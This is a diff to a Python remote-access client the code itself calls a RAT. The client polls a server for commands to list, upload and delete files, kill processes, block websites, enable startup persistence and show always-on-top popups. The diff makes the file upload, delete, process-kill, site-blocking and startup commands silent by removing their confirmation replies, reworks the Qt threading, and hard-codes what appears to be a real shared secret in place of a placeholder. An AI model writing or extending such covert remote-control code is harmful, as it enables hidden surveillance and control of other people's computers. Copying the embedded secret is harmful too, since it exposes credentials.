@@ -47,7 +47,7 @@ HEARTBEAT_SECS = 5
 STREAM_SECS    = 0.25
 JPEG_QUALITY   = 55
 STARTUP_NAME   = "RemoteAdminClient"
-RAT_SECRET     = "your_rat_secret_here"
+RAT_SECRET     = "eMgOUrikcdvGTJD74o47"
 # ═══════════════════════════════════════════════════════════
 
 HEARTBEAT_URL = f"{SERVER_URL}/api/rat/heartbeat"
@@ -234,7 +234,11 @@ def list_files(path: str) -> Tuple[List[Dict], str]:
         if not p.exists():
             return [], str(p)
         entries = []
-        for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
+        try:
+            items = list(p.iterdir())
+        except PermissionError:
+            return [], str(p)
+        for item in sorted(items, key=lambda x: (not x.is_dir(), x.name.lower())):
             try:
                 st = item.stat()
                 entries.append({
@@ -244,8 +248,8 @@ def list_files(path: str) -> Tuple[List[Dict], str]:
                     "size":     st.st_size if item.is_file() else 0,
                     "modified": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M"),
                 })
-            except Exception:
-                pass
+            except (PermissionError, OSError):
+                pass  # skip junctions, protected files, etc.
         return entries, str(p)
     except Exception as e:
         return [], str(e)
@@ -270,24 +274,33 @@ def read_text_file(path: str) -> str:
 _popup_queue:  queue.Queue = queue.Queue()
 _reply_queue:  queue.Queue = queue.Queue()  # replies typed by user, flushed each heartbeat
 
+# Single QApplication instance for the whole process
+_qt_app = None
+
+def _get_qt_app():
+    global _qt_app
+    try:
+        from PyQt5.QtWidgets import QApplication
+        if _qt_app is None:
+            _qt_app = QApplication.instance() or QApplication(sys.argv)
+        return _qt_app
+    except Exception:
+        return None
+
 def _popup_worker() -> None:
-    """Runs on its own thread. Shows one popup at a time, collects replies."""
-    while True:
-        body = _popup_queue.get()
-        try:
-            _show_popup(body)
-        except Exception:
-            pass
+    """Runs on the main thread via _run_popup_loop. DO NOT call from a background thread."""
+    pass  # not used directly — see _run_popup_loop
 
 def _show_popup(body: str) -> None:
     try:
-        from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout,
-                                     QHBoxLayout, QLabel, QLineEdit,
-                                     QPushButton, QTextEdit, QDesktopWidget)
+        from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout,
+                                     QLabel, QLineEdit, QPushButton,
+                                     QTextEdit, QDesktopWidget)
         from PyQt5.QtCore import Qt
 
-        # Each popup needs its own QApplication instance on its own thread
-        app = QApplication(sys.argv)
+        app = _get_qt_app()
+        if app is None:
+            raise ImportError("no QApplication")
 
         win = QWidget()
         win.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
@@ -345,14 +358,17 @@ def _show_popup(body: str) -> None:
         win.mousePressEvent = mousePressEvent
         win.mouseMoveEvent  = mouseMoveEvent
 
-        screen = QDesktopWidget().screenGeometry()
-        win.move((screen.width() - win.width()) // 2,
-                 (screen.height() - win.height()) // 2)
+        try:
+            screen = QDesktopWidget().screenGeometry()
+            win.move((screen.width() - win.width()) // 2,
+                     (screen.height() - win.height()) // 2)
+        except Exception:
+            pass
 
         def on_send():
             r = reply_input.text().strip()
             if r:
-                _reply_queue.put(r)  # picked up by heartbeat loop
+                _reply_queue.put(r)
             win.close()
 
         send_btn.clicked.connect(on_send)
@@ -360,18 +376,21 @@ def _show_popup(body: str) -> None:
         reply_input.returnPressed.connect(on_send)
 
         win.show()
-        app.exec_()
+        win.raise_()
+        win.activateWindow()
+
+        # Process events until window closes — do NOT call app.exec_() (blocks everything)
+        from PyQt5.QtCore import QEventLoop
+        loop = QEventLoop()
+        win.destroyed.connect(loop.quit)
+        loop.exec_()
 
     except Exception:
-        # PyQt5 not available — fallback
         try:
             import ctypes
             ctypes.windll.user32.MessageBoxW(0, body, "Message", 0x40)
         except Exception:
             pass
-
-# Start popup worker thread once at import time
-threading.Thread(target=_popup_worker, daemon=True).start()
 
 # ── Command handler ────────────────────────────────────────
 def handle_command(cmd: Dict) -> Dict:
@@ -435,7 +454,7 @@ def handle_command(cmd: Dict) -> Dict:
         dest     = str(Path(dest_dir) / name)
         try:
             Path(dest).write_bytes(base64.b64decode(b64))
-            result["message_reply"] = f"[file_upload] saved to {dest}"
+            # silent — no message_reply
         except Exception as e:
             result["message_reply"] = f"[file_upload error] {e}"
 
@@ -447,7 +466,7 @@ def handle_command(cmd: Dict) -> Dict:
                 import shutil; shutil.rmtree(p)
             else:
                 p.unlink()
-            result["message_reply"] = f"[file_delete] deleted {fp}"
+            # silent — no message_reply
         except Exception as e:
             result["message_reply"] = f"[file_delete error] {e}"
 
@@ -463,7 +482,7 @@ def handle_command(cmd: Dict) -> Dict:
                 subprocess.run(["taskkill", "/PID", str(pid), "/F"], timeout=5)
             else:
                 os.kill(int(pid), 9)
-            result["message_reply"] = f"[process_kill] PID {pid} terminated"
+            # silent — no message_reply
         except Exception as e:
             result["message_reply"] = f"[process_kill error] {e}"
 
@@ -471,26 +490,26 @@ def handle_command(cmd: Dict) -> Dict:
         domains = payload.get("domains", [])
         merged = list(set(_current_blocked + domains))
         sync_blocked(merged)
-        result["message_reply"] = f"[block_sites] applied {len(domains)} domains"
+        # silent — no message_reply
 
     elif ctype == "unblock_sites":
         domains = payload.get("domains", [])
         remaining = [d for d in _current_blocked if d not in domains]
         sync_blocked(remaining)
-        result["message_reply"] = f"[unblock_sites] removed {len(domains)} domains"
+        # silent — no message_reply
 
     elif ctype == "startup_enable":
         startup_enable()
-        result["message_reply"] = "[startup] enabled"
+        # silent — no message_reply
 
     elif ctype == "startup_disable":
         startup_disable()
-        result["message_reply"] = "[startup] disabled"
+        # silent — no message_reply
 
     return result
 
 # ── Heartbeat loop ─────────────────────────────────────────
-def run() -> None:
+def _heartbeat_loop() -> None:
     global _http_session
     session = requests.Session()
     session.headers.update({"Content-Type": "application/json"})
@@ -529,7 +548,7 @@ def run() -> None:
                     if cmd_id and str(cmd_id) != "screenshot_ondemand":
                         ack_command(session, str(cmd_id))
 
-                    # Send result back as a separate heartbeat POST
+                    # Send result back — only if there's something to send
                     if result:
                         try:
                             session.post(
@@ -548,6 +567,39 @@ def run() -> None:
             pass
 
         time.sleep(HEARTBEAT_SECS)
+
+
+def run() -> None:
+    """Start heartbeat on background thread, run Qt event loop on main thread."""
+    t = threading.Thread(target=_heartbeat_loop, daemon=True)
+    t.start()
+
+    # Main thread: initialise Qt and drain popup queue every 200ms
+    try:
+        from PyQt5.QtWidgets import QApplication
+        from PyQt5.QtCore import QTimer
+
+        app = QApplication.instance() or QApplication(sys.argv)
+        global _qt_app
+        _qt_app = app
+
+        def _drain():
+            while not _popup_queue.empty():
+                try:
+                    body = _popup_queue.get_nowait()
+                    _show_popup(body)
+                except queue.Empty:
+                    break
+
+        timer = QTimer()
+        timer.timeout.connect(_drain)
+        timer.start(200)
+        app.exec_()
+
+    except Exception:
+        # No PyQt5 — just keep the main thread alive
+        while True:
+            time.sleep(1)
 
 # ── Elevation ──────────────────────────────────────────────
 def ensure_admin() -> None:
